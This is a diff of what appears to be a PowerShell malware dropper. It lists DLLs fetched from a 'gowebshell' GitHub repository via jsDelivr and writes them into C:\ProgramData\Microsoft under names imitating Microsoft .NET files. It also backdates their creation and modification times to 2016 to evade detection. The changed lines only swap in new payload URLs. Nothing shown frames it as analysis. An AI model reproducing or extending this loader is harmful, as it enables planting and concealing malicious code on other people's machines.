@@ -1,12 +1,12 @@
 $fileList = @(
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/baidu/exe/x64.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/baidu/exe/x641.dll"
         OutputPath = "C:\ProgramData\Microsoft\mscorst64.dll"
         CreationTime = Get-Date "2016-07-16 21:18:00"
         ModificationTime = Get-Date "2016-07-16 21:18:00"
     },
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/baidu/exe/x86.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/baidu/exe/x861.dll"
         OutputPath = "C:\ProgramData\Microsoft\mscorst.dll"
         CreationTime = Get-Date "2016-07-17 10:30:00"
         ModificationTime = Get-Date "2016-07-17 10:30:00"
